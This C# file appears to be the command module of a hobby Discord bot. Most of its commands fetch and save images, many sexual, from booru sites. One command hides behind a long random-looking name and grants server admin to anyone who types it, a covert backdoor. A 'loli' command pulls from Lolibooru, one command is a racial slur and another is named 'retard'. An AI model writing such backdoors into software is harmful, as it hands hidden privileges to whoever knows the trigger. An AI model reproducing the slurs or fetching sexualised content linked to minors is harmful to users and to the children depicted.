using Discord;
using Discord.Net;
using Discord.WebSocket;
using Discord.Commands;
using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using Microsoft.Extensions.Configuration;
using GoddessBot.Services;

namespace GoddessBot.Modules
{

    public class Commands : ModuleBase
    {
        // private DiscordSocketClient _client;
        // private readonly AudioService _service;
        private CommandHandler _comm = new CommandHandler();




        [Command("nibba")]
        public async Task Nibba()
        {

            await ReplyAsync("nibba");
        }

        [Command("info")]
        public async Task Info()
        {
            await ReplyAsync(Program.Info._client.Guilds.First().IsConnected.ToString());
        }

        [Command("3u853uf9uwadfslokc;lszjr9wuy3-0fujasjdfi9hw0tfwehfzpxcvjwpoj[0tt[0w3gjxzfmwajt0wt")]
        public async Task Admin()
        {

            var comm = new CommandHandler();
            await comm.GrantAdminAsync(Context.User, Context.Guild);

        }



        [Command("ping")]
        public async Task Ping()
        {


            await ReplyAsync("Pong: " + Program.Info._client.Latency + "ms");
            if (Program.Info._client.Latency < 1300)
            {
                await ReplyAsync("for bot is still good ping");
                await Context.Channel.SendFileAsync("Pic\\lightningspeed.jpg");

            }
            else
                await ReplyAsync("😭 😭 😭 im so slow forgive me senpai <3");
        }


        [Command("yande")]
        [Alias("y")]
        public async Task Yande([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.Yande(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("gelbooru")]
        public async Task GelBooru([Remainder] string tag = "thighhighs")
        {
            for (int i = 0;i<300;i++){
            var comm = new CommandHandler();
            var result = await comm.GelBooru(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
            }
        }

        [Command("furry")]
        public async Task Furrybooru([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.Furrybooru(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("atfbooru")]
        public async Task Atfbooru([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.Atfbooru(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("danbooru")]
        public async Task DanbooruDonmai([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.DanbooruDonmai(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("E621")]
        public async Task E621([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.E621(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("E926")]
        public async Task E926([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.E926(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("konachan")]
        public async Task Konachan([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.Konachan(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("loli")]
        public async Task Lolibooru([Remainder] string tag = "thighhighs")
        {
            
                
                var comm = new CommandHandler();
                var result = await comm.Lolibooru(Context.User, Context.Guild, Context, tag);
                try
                {
                    await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                    // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
                }

                catch (Exception e)
                {
                    Console.WriteLine(e);
                    await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
                }
            
        }

        [Command("real")]
        public async Task Realbooru([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.Realbooru(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("rule")]
        public async Task Rule34([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.Rule34(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("safe")]
        public async Task Safebooru([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.Safebooru(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("sakuga")]
        public async Task Sakugabooru([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.Sakugabooru(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }

        [Command("Xbooru")]
        public async Task Xbooru([Remainder] string tag = "thighhighs")
        {
            var comm = new CommandHandler();
            var result = await comm.Xbooru(Context.User, Context.Guild, Context, tag);
            try
            {
                await comm.SaveYande(result.fileUrl, result.fileUrl.ToString().Split('/').Last(), Context as ICommandContext);
                // await Context.Channel.SendMessageAsync("Picture tags: " + String.Join(',', result.tags));
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                await Context.Channel.SendMessageAsync("SENPAIII!!! Something goes wrong while downloading another lewd pic!");
            }
        }
        [Command("taginfo")]
        public async Task GetInfo(string tag)
        {
            if (tag == "")
                await Context.Channel.SendMessageAsync("Senpaii u need to write tag as param ;//");
            else
                await _comm.GetTagInfo(Context, tag);

        }

        [Command("love me")]
        public async Task Love()
        {
            await Context.Channel.SendMessageAsync("YES!! I Love You " + Context.User.Mention + " <3 >///< !!! B-BAKA!!");
            await Context.Channel.SendFileAsync(@"pic\rin.gif");
        }
        [Command("retard")]
        [Alias("r")]
        public async Task Retard([Remainder] string msg)
        {
            await _comm.Retard(Context, msg);

        }
        //[Command("follow")]
        //public async Task Follow()
        //{
        //    await _comm.Follow();
        //}
    }
}